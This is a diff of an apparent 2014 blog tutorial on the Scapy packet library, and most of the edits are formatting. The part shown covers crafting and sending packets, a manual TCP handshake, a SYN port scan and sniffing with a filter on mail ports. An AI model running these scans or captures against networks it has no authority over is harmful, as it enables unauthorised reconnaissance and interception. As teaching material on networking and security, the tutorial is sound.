@@ -97,7 +97,7 @@
                 <div class="entry-content">
                 <div class="well">
 <footer class="post-info">
-<abbr class="published" title="2014-12-22T00:00:00">
+<abbr class="published" title="2014-12-22T00:00:00-05:00">
       Mon 22 December 2014 </abbr>
 
 <span class="label"> Category</span>
@@ -118,17 +118,17 @@
                 <p>This is a review about one of my favorites libraries in Python: <a href="http://www.secdev.org/projects/scapy/">Scapy</a>, which is a very powerful <strong>packet manipulation</strong> resource.</p>
 <p><strong>Scapy</strong>  is able to forge and decode packets of several protocols, send and capture them, match requests and replies, and much more. It can be used to handle most network tasks such as scanning, tracerouting, probing, attacks, network discovery, to name a few.</p>
 <p>Before we start, make sure you have Scapy in your machine:</p>
-<div class="highlight"><pre><span class="nv">$ </span>pip install scapy
+<div class="highlight"><pre><span></span>$ pip install scapy
 </pre></div>
 
 
 <p>You can test the installation firing up Scapy iteratively. For example, these are some useful functions:</p>
-<div class="highlight"><pre><span class="nv">$ </span>scapy
-Welcome to Scapy <span class="o">(</span>2.2.0<span class="o">)</span>
+<div class="highlight"><pre><span></span>$ scapy
+Welcome to Scapy <span class="o">(</span><span class="m">2</span>.2.0<span class="o">)</span>
 &gt;&gt;&gt; ls<span class="o">()</span>    ---&gt; list protocols/layers
 &gt;&gt;&gt; lsc<span class="o">()</span>   ---&gt; list commands
 &gt;&gt;&gt; conf    ---&gt; Display configurations
-&gt;&gt;&gt; <span class="nb">help</span><span class="o">(</span>sniff<span class="o">)</span>     --&gt; Help <span class="k">for </span>a specific <span class="nb">command</span>
+&gt;&gt;&gt; help<span class="o">(</span>sniff<span class="o">)</span>     --&gt; Help <span class="k">for</span> a specific <span class="nb">command</span>
 </pre></div>
 
 
@@ -139,25 +139,25 @@ Welcome to Scapy <span class="o">(</span>2.2.0<span class="o">)</span>
 <li><a href="#arp">ARP Poisoning a Machine</a>, and</li>
 <li><a href="#pcap">Processing PCAP Files</a>.</li>
 </ul>
-<hr />
+<hr>
 <h1><a name="intro"></a> Scapy 101</h1>
 <h2>A Simple Packet and its Headers</h2>
 <p>The basic unit in a  network communication is the <em>packet</em>.  So let's create one!</p>
 <p>Scapy builds packets by the <em>layers</em> and then by the <em>fields</em> in each layer. Each layer is nested inside the parent layer, represented by the <strong>&lt;</strong> and <strong>&gt;</strong> brackets.</p>
 <p>Let's start by specifying the packet's source IP and then its destination IP. This type of information goes in the <strong>IP header</strong>, which is a <em>layer 3 protocol</em> in the <a href="http://bt3gl.github.io/wiresharking-for-fun-or-profit.html">0SI model</a>:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s">&quot;192.168.1.114&quot;</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span><span class="o">.</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;192.168.1.25&quot;</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="s2">&quot;192.168.1.114&quot;</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span><span class="o">.</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;192.168.1.25&quot;</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">pritnt</span> <span class="n">ip</span>
 <span class="o">&lt;</span><span class="n">IP</span>  <span class="n">src</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.114</span> <span class="n">dst</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.25</span> <span class="o">|&gt;</span>
 </pre></div>
 
 
 <p>Now let's add  a <em>layer 4 protocol</em>, such as  <strong>TCP</strong> or <strong>UDP</strong>. To attach this header to the previous, we use the the operator <strong>/</strong> (which is used as a composition operator between layers):</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span><span class="o">/</span><span class="n">TCP</span><span class="p">()</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">ip</span><span class="o">/</span><span class="n">TCP</span><span class="p">()</span>
 <span class="o">&lt;</span><span class="n">IP</span>  <span class="n">frag</span><span class="o">=</span><span class="mi">0</span> <span class="n">proto</span><span class="o">=</span><span class="n">tcp</span> <span class="n">src</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">0.1</span> <span class="n">dst</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">0.2</span> <span class="o">|&lt;</span><span class="n">TCP</span>  <span class="o">|&gt;&gt;</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="n">tcp</span><span class="o">=</span><span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">1025</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="p">(</span><span class="n">tcp</span><span class="o">/</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
-<span class="c">###[ TCP ]###</span>
+<span class="c1">###[ TCP ]###</span>
   <span class="n">sport</span><span class="o">=</span> <span class="mi">1025</span>
   <span class="n">dport</span><span class="o">=</span> <span class="n">www</span>
   <span class="n">seq</span><span class="o">=</span> <span class="mi">0</span>
@@ -169,7 +169,7 @@ Welcome to Scapy <span class="o">(</span>2.2.0<span class="o">)</span>
   <span class="n">chksum</span><span class="o">=</span> <span class="bp">None</span>
   <span class="n">urgptr</span><span class="o">=</span> <span class="mi">0</span>
   <span class="n">options</span><span class="o">=</span> <span class="p">{}</span>
-<span class="c">###[ IP ]###</span>
+<span class="c1">###[ IP ]###</span>
      <span class="n">version</span><span class="o">=</span> <span class="mi">4</span>
      <span class="n">ihl</span><span class="o">=</span> <span class="bp">None</span>
      <span class="n">tos</span><span class="o">=</span> <span class="mh">0x0</span>
@@ -183,81 +183,81 @@ Welcome to Scapy <span class="o">(</span>2.2.0<span class="o">)</span>
 
 
 <p>We could even go further, adding <em>layer 2 protocols</em> such as <strong>Ethernet</strong> or <strong>IEEE 802.11</strong>:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">Ether</span><span class="p">()</span><span class="o">/</span><span class="n">Dot1Q</span><span class="p">()</span><span class="o">/</span><span class="n">IP</span><span class="p">()</span>
-<span class="o">&lt;</span><span class="n">Ether</span>  <span class="n">type</span><span class="o">=</span><span class="mh">0x8100</span> <span class="o">|&lt;</span><span class="n">Dot1Q</span>  <span class="n">type</span><span class="o">=</span><span class="mh">0x800</span> <span class="o">|&lt;</span><span class="n">IP</span>  <span class="o">|&gt;&gt;&gt;</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">Dot11</span><span class="p">()</span><span class="o">/</span><span class="n">IP</span><span class="p">()</span>
-<span class="o">&lt;</span><span class="n">Dot11</span>  <span class="o">|&lt;</span><span class="n">IP</span>  <span class="o">|&gt;&gt;</span>
+<div class="highlight"><pre><span></span>&gt;&gt;&gt; Ether()/Dot1Q()/IP()
+&lt;Ether  type=0x8100 |&lt;Dot1Q  type=0x800 |&lt;IP  |&gt;&gt;&gt;
+&gt;&gt;&gt; Dot11()/IP()
+&lt;Dot11  |&lt;IP  |&gt;&gt;
 </pre></div>
 
 
 <h3>Sending a Packet: Layer 2 vs. Layer 3</h3>
 <p>Now that we have a (very simple) packet, we can send it over the wire.</p>
 <p>Scapy's method <a href="http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets">send</a>  is used to send a single packet to the IP destination. This is a <em>layer 3</em> operation, so  the route is based on the local table:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
-<span class="p">.</span>
-<span class="n">Sent</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">.</span>
+<div class="highlight"><pre><span></span>&gt;&gt;&gt; send(ip/tcp)
+.
+Sent 1 packets.
 </pre></div>
 
 
 <p>In another hand, Scapy's method <a href="http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets">sendp</a> works in the <em>layer 2</em>:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">sendp</span><span class="p">(</span><span class="n">Ether</span><span class="p">()</span><span class="o">/</span><span class="n">ip</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
-<span class="p">.</span>
-<span class="n">Sent</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">.</span>
+<div class="highlight"><pre><span></span>&gt;&gt;&gt; sendp(Ether()/ip/tcp)
+.
+Sent 1 packets.
 </pre></div>
 
 
 <h3>Sending an ICMP Packet</h3>
 <p>For example, let us create an ICMP packet with some message:</p>
-<div class="highlight"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&quot;192.168.1.114&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s">&quot;Helloooo!&quot;</span>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;192.168.1.114&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s2">&quot;Helloooo!&quot;</span>
 <span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
 <span class="n">packet</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
 </pre></div>
 
 
 <p>Notice that the method <strong>show()</strong> displays details about the packet. Running the snippet above gives:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo python send_packet.py
+<div class="highlight"><pre><span></span>$ sudo python send_packet.py
 .
-Sent 1 packets.
-<span class="c">###[ IP ]###</span>
-  <span class="nv">version</span>   <span class="o">=</span> 4
+Sent <span class="m">1</span> packets.
+<span class="c1">###[ IP ]###</span>
+  <span class="nv">version</span>   <span class="o">=</span> <span class="m">4</span>
   <span class="nv">ihl</span>       <span class="o">=</span> None
   <span class="nv">tos</span>       <span class="o">=</span> 0x0
   <span class="nv">len</span>       <span class="o">=</span> None
-  <span class="nv">id</span>        <span class="o">=</span> 1
+  <span class="nv">id</span>        <span class="o">=</span> <span class="m">1</span>
   <span class="nv">flags</span>     <span class="o">=</span>
-  <span class="nv">frag</span>      <span class="o">=</span> 0
-  <span class="nv">ttl</span>       <span class="o">=</span> 64
+  <span class="nv">frag</span>      <span class="o">=</span> <span class="m">0</span>
+  <span class="nv">ttl</span>       <span class="o">=</span> <span class="m">64</span>
   <span class="nv">proto</span>     <span class="o">=</span> icmp
   <span class="nv">chksum</span>    <span class="o">=</span> None
-  <span class="nv">src</span>       <span class="o">=</span> 192.168.1.114
-  <span class="nv">dst</span>       <span class="o">=</span> 192.168.1.114
+  <span class="nv">src</span>       <span class="o">=</span> <span class="m">192</span>.168.1.114
+  <span class="nv">dst</span>       <span class="o">=</span> <span class="m">192</span>.168.1.114
   <span class="se">\o</span>ptions   <span class="se">\</span>
-<span class="c">###[ ICMP ]###</span>
-     <span class="nb">type</span>      <span class="o">=</span> <span class="nb">echo</span>-request
-     <span class="nv">code</span>      <span class="o">=</span> 0
+<span class="c1">###[ ICMP ]###</span>
+     <span class="nb">type</span>      <span class="o">=</span> echo-request
+     <span class="nv">code</span>      <span class="o">=</span> <span class="m">0</span>
      <span class="nv">chksum</span>    <span class="o">=</span> None
      <span class="nv">id</span>        <span class="o">=</span> 0x0
      <span class="nv">seq</span>       <span class="o">=</span> 0x0
-<span class="c">###[ Raw ]###</span>
+<span class="c1">###[ Raw ]###</span>
         <span class="nv">load</span>      <span class="o">=</span> <span class="s1">&#39;Helloooo!&#39;</span>
 </pre></div>
 
 
 <p>This  is how this packet looks like in <a href="">Wireshark</a>:
-<img alt="" src="http://i.imgur.com/jjuWHaZ.png" /></p>
+<img alt="" src="http://i.imgur.com/jjuWHaZ.png"></p>
 <p>To send the same packet over again we can simply add the <strong>loop=1</strong> argument within the <strong>send</strong> method:</p>
-<div class="highlight"><pre><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">loop</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
 </pre></div>
 
 
-<div class="highlight"><pre><span class="nv">$ </span>sudo python send_packet.py
+<div class="highlight"><pre><span></span>$ sudo python send_packet.py
 .....................................................................................................................
 </pre></div>
 
 
 <p>Which looks like this in Wireshark:</p>
-<p><img alt="" src="http://i.imgur.com/lv89lc3.png" /></p>
+<p><img alt="" src="http://i.imgur.com/lv89lc3.png"></p>
 <h3>Sending &amp; Receiving a Packet</h3>
 <p>Scapy also has the ability to listen for responses to packets it sends (for example, ICMP ping requests).</p>
 <p>As in the send method, Scapy has two types of packet sending &amp; receiving, based on the network layer.</p>
@@ -266,74 +266,74 @@ Sent 1 packets.
 <p>A good way to remember their differences is to keep in mind that functions with a <strong>1</strong>  are designed to send the specified packet and <strong>end after receiving 1 answer/response</strong> (instead of <strong>continuing to listen for answers/responses</strong>).</p>
 <h3>Sending &amp; Receiving a ICMP Packet</h3>
 <p>For example, we can  build an IP packet carrying an ICMP header, which has a default type of echo request, and use the <strong>sr()</strong> function to transmit the packet and record any response:</p>
-<div class="highlight"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">output</span><span class="o">=</span><span class="n">sr</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&#39;google.com&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">())</span>
-<span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Output is:&#39;</span> <span class="o">+</span> <span class="n">output</span>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">output</span><span class="o">=</span><span class="n">sr</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;google.com&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">ICMP</span><span class="p">())</span>
+<span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Output is:&#39;</span> <span class="o">+</span> <span class="n">output</span>
 <span class="n">result</span><span class="p">,</span> <span class="n">unanswered</span><span class="o">=</span><span class="n">output</span>
-<span class="k">print</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">Result is:&#39;</span> <span class="o">+</span> <span class="n">result</span>
+<span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Result is:&#39;</span> <span class="o">+</span> <span class="n">result</span>
 </pre></div>
 
 
 <p>Running the above snippet results in:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo python receive_packet.py
+<div class="highlight"><pre><span></span>$ sudo python receive_packet.py
 Begin emission:
-.Finished to send 1 packets.
+.Finished to send <span class="m">1</span> packets.
 *
-Received 2 packets, got 1 answers, remaining 0 packets
+Received <span class="m">2</span> packets, got <span class="m">1</span> answers, remaining <span class="m">0</span> packets
 
 Output is:
 <span class="o">(</span>&lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;<span class="o">)</span>
 
 Result is:
-<span class="o">[(</span>&lt;IP  <span class="nv">frag</span><span class="o">=</span>0 <span class="nv">proto</span><span class="o">=</span>icmp <span class="nv">dst</span><span class="o">=</span>74.125.228.40 |&lt;ICMP  |&gt;&gt;, &lt;IP  <span class="nv">version</span><span class="o">=</span>4L <span class="nv">ihl</span><span class="o">=</span>5L <span class="nv">tos</span><span class="o">=</span>0x0 <span class="nv">len</span><span class="o">=</span>28 <span class="nv">id</span><span class="o">=</span>9762 <span class="nv">flags</span><span class="o">=</span> <span class="nv">frag</span><span class="o">=</span>0L <span class="nv">ttl</span><span class="o">=</span>53 <span class="nv">proto</span><span class="o">=</span>icmp <span class="nv">chksum</span><span class="o">=</span>0x6eff <span class="nv">src</span><span class="o">=</span>74.125.228.40 <span class="nv">dst</span><span class="o">=</span>192.168.1.114 <span class="nv">options</span><span class="o">=[]</span> |&lt;ICMP  <span class="nb">type</span><span class="o">=</span><span class="nb">echo</span>-reply <span class="nv">code</span><span class="o">=</span>0 <span class="nv">chksum</span><span class="o">=</span>0x0 <span class="nv">id</span><span class="o">=</span>0x0 <span class="nv">seq</span><span class="o">=</span>0x0 |&gt;&gt;<span class="o">)]</span>
+<span class="o">[(</span>&lt;IP  <span class="nv">frag</span><span class="o">=</span><span class="m">0</span> <span class="nv">proto</span><span class="o">=</span>icmp <span class="nv">dst</span><span class="o">=</span><span class="m">74</span>.125.228.40 <span class="p">|</span>&lt;ICMP  <span class="p">|</span>&gt;&gt;, &lt;IP  <span class="nv">version</span><span class="o">=</span>4L <span class="nv">ihl</span><span class="o">=</span>5L <span class="nv">tos</span><span class="o">=</span>0x0 <span class="nv">len</span><span class="o">=</span><span class="m">28</span> <span class="nv">id</span><span class="o">=</span><span class="m">9762</span> <span class="nv">flags</span><span class="o">=</span> <span class="nv">frag</span><span class="o">=</span>0L <span class="nv">ttl</span><span class="o">=</span><span class="m">53</span> <span class="nv">proto</span><span class="o">=</span>icmp <span class="nv">chksum</span><span class="o">=</span>0x6eff <span class="nv">src</span><span class="o">=</span><span class="m">74</span>.125.228.40 <span class="nv">dst</span><span class="o">=</span><span class="m">192</span>.168.1.114 <span class="nv">options</span><span class="o">=[]</span> <span class="p">|</span>&lt;ICMP  <span class="nv">type</span><span class="o">=</span>echo-reply <span class="nv">code</span><span class="o">=</span><span class="m">0</span> <span class="nv">chksum</span><span class="o">=</span>0x0 <span class="nv">id</span><span class="o">=</span>0x0 <span class="nv">seq</span><span class="o">=</span>0x0 <span class="p">|</span>&gt;&gt;<span class="o">)]</span>
 </pre></div>
 
 
 <h3>Sending and Receiving in a Loop</h3>
 <p>What if we want to send and listen for responses to multiple copies of the same packet? This can be done with the <a href="http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-in-a-loop">srloop()</a> method and a <strong>count</strong> value:</p>
-<div class="highlight"><pre>&gt;&gt;&gt; srloop<span class="o">(</span>IP<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s2">&quot;www.goog&quot;</span><span class="o">)</span>/ICMP<span class="o">()</span>, <span class="nv">count</span><span class="o">=</span>3<span class="o">)</span>
-RECV 1: IP / ICMP 74.125.228.51 &gt; 192.168.1.114 <span class="nb">echo</span>-reply 0
-RECV 1: IP / ICMP 74.125.228.51 &gt; 192.168.1.114 <span class="nb">echo</span>-reply 0
-RECV 1: IP / ICMP 74.125.228.51 &gt; 192.168.1.114 <span class="nb">echo</span>-reply 0
+<div class="highlight"><pre><span></span>&gt;&gt;&gt; srloop<span class="o">(</span>IP<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s2">&quot;www.goog&quot;</span><span class="o">)</span>/ICMP<span class="o">()</span>, <span class="nv">count</span><span class="o">=</span><span class="m">3</span><span class="o">)</span>
+RECV <span class="m">1</span>: IP / ICMP <span class="m">74</span>.125.228.51 &gt; <span class="m">192</span>.168.1.114 echo-reply <span class="m">0</span>
+RECV <span class="m">1</span>: IP / ICMP <span class="m">74</span>.125.228.51 &gt; <span class="m">192</span>.168.1.114 echo-reply <span class="m">0</span>
+RECV <span class="m">1</span>: IP / ICMP <span class="m">74</span>.125.228.51 &gt; <span class="m">192</span>.168.1.114 echo-reply <span class="m">0</span>
 
-Sent 3 packets, received 3 packets. 100.0% hits.
+Sent <span class="m">3</span> packets, received <span class="m">3</span> packets. <span class="m">100</span>.0% hits.
 </pre></div>
 
 
-<hr />
+<hr>
 <h2>A TCP Three-way Handshake</h2>
 <p>Scapy allows you to craft SYN request and match the corresponding returned <a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol">SYN/ACK</a> segment.</p>
 <p>This is how it works:</p>
 <p>1) we create an instance of an IP header:</p>
-<div class="highlight"><pre><span class="n">ip</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="err">&#39;</span><span class="mf">192.168.1.114</span><span class="err">&#39;</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="err">&#39;</span><span class="mf">192.168.1.25</span><span class="err">&#39;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span>ip = IP(src=&#39;192.168.1.114&#39;, dst=&#39;192.168.1.25&#39;)
 </pre></div>
 
 
 <p>2) we define a SYN instance of the TCP header:</p>
-<div class="highlight"><pre><span class="n">SYN</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="sc">&#39;S&#39;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">12345</span><span class="p">)</span>
+<div class="highlight"><pre><span></span>SYN = TCP(sport=1024, dport=80, flags=&#39;S&#39;, seq=12345)
 </pre></div>
 
 
 <p>3) we send this and capture the server's response with  <strong>sr1</strong>:</p>
-<div class="highlight"><pre><span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">SYN</span>
-<span class="n">SYNACK</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+<div class="highlight"><pre><span></span>packet = ip/SYN
+SYNACK = sr1(packet)
 </pre></div>
 
 
 <p>4) we extract the server's TCP sequence number from the server, with <strong>SYNACK.seq</strong>, and  increment it by 1:</p>
-<div class="highlight"><pre><span class="n">ack</span> <span class="o">=</span> <span class="n">SYNACK</span><span class="p">.</span><span class="n">seq</span> <span class="o">+</span> <span class="mi">1</span>
+<div class="highlight"><pre><span></span>ack = SYNACK.seq + 1
 </pre></div>
 
 
 <p>5) we create a new instance of the TCP header <strong>ACK</strong>, which now has the flag <strong>A</strong> (placing the acknowledgment  value for the server there) and  we send everything out:</p>
-<div class="highlight"><pre><span class="n">ACK</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">12346</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">ack</span><span class="p">)</span>
-<span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">ACK</span><span class="p">)</span>
+<div class="highlight"><pre><span></span>ACK = TCP(sport=1024, dport=80, flags=&#39;A&#39;, seq=12346, ack=ack)
+send(ip/ACK)
 </pre></div>
 
 
 <p>6)  Finally, we create the segment with no TCP flags and payload and send it:</p>
-<div class="highlight"><pre><span class="n">PUSH</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s">&#39;&#39;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">12346</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">ack</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="s">&quot;HELLO!&quot;</span>
+<div class="highlight"><pre><span></span><span class="n">PUSH</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">12346</span><span class="p">,</span> <span class="n">ack</span><span class="o">=</span><span class="n">ack</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;HELLO!&quot;</span>
 <span class="n">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">PUSH</span><span class="o">/</span><span class="n">data</span><span class="p">)</span>
 </pre></div>
 
@@ -341,62 +341,62 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 <p>However, running the snippet above will not work.</p>
 <p>The reason is that crafting TCP sessions with Scapy circumvents the native TCP/IP stack. Since the host is unaware that Scapy is sending packets, the native host would receive an unsolicited SYN/ACK that is not associated with any known open session/socket. This would result in the host reseting the connection when receiving the SYN/ACK.</p>
 <p>One solution is to use the host's firewall with <a href="http://en.wikipedia.org/wiki/Iptables">iptables</a> to block the outbound resets. For example, to drop all outbound packets that are TCP and destined for IP 192.168.1.25 from 192.168.1.114 to destination port 80, examining the flag bits, we can run:</p>
-<div class="highlight"><pre><span class="nv">$ </span>sudo iptables -A OUTPUT -p tcp -d 192.168.1.25 -s 192.168.1.114 --dport 80 --tcp-flags RST -j DROP
+<div class="highlight"><pre><span></span>$ sudo iptables -A OUTPUT -p tcp -d <span class="m">192</span>.168.1.25 -s <span class="m">192</span>.168.1.114 --dport <span class="m">80</span> --tcp-flags RST -j DROP
 </pre></div>
 
 
 <p>This does not prevent the source host from generating a reset each time it receives a packet from the session, however it does block it from silencing the resets.</p>
-<hr />
+<hr>
 <h2>Network Scanning and Sniffing</h2>
 <p>Now that we know the Scapy basics, let's learn how to perform a <strong>port scanning</strong>.</p>
 <p>A very simple scanner can be crafted by sending a TCP/IP packet with the TCP flag set to SYM to every port in the range 1-1024 (this will take a couple of minutes to scan):</p>
-<div class="highlight"><pre><span class="n">res</span><span class="p">,</span> <span class="n">unans</span> <span class="o">=</span> <span class="n">sr</span><span class="p">(</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">&#39;192.168.1.114&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">flags</span><span class="o">=</span><span class="s">&#39;S&#39;</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)))</span>
+<div class="highlight"><pre><span></span><span class="n">res</span><span class="p">,</span> <span class="n">unans</span> <span class="o">=</span> <span class="n">sr</span><span class="p">(</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s1">&#39;192.168.1.114&#39;</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">flags</span><span class="o">=</span><span class="s1">&#39;S&#39;</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)))</span>
 </pre></div>
 
 
 <p>We can check the output with:</p>
-<div class="highlight"><pre><span class="n">res</span><span class="o">.</span><span class="n">summary</span><span class="p">()</span>
+<div class="highlight"><pre><span></span><span class="n">res</span><span class="o">.</span><span class="n">summary</span><span class="p">()</span>
 </pre></div>
 
 
 <h3>The Sniff() Method</h3>
 <p>In Scapy, packet sniffing can be done with the function <a href="http://www.secdev.org/projects/scapy/doc/usage.html#sniffing">sniff()</a>.  The <strong>iface</strong> parameter tells the sniffer which network interface to sniff on. The <strong>count</strong> parameter specifies how many packet we want to sniff (where a blank value is infinite):</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth1&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
 <span class="o">&gt;&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">summary</span><span class="p">()</span>
 </pre></div>
 
 
 <p>We can specify filters too:</p>
-<div class="highlight"><pre><span class="o">&gt;&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">filter</span><span class="o">=</span><span class="s">&quot;tcp and (port 25 or port 110)&quot;</span><span class="p">)</span>
+<div class="highlight"><pre><span></span>&gt;&gt;&gt;&gt; p = sniff(filter=&quot;tcp and (port 25 or port 110)&quot;)
 </pre></div>
 
 
 <p>We can also use <strong>sniff</strong> with a  customized callback function to every packet that matches the filter, with the <strong>prn</strong> parameter:</p>
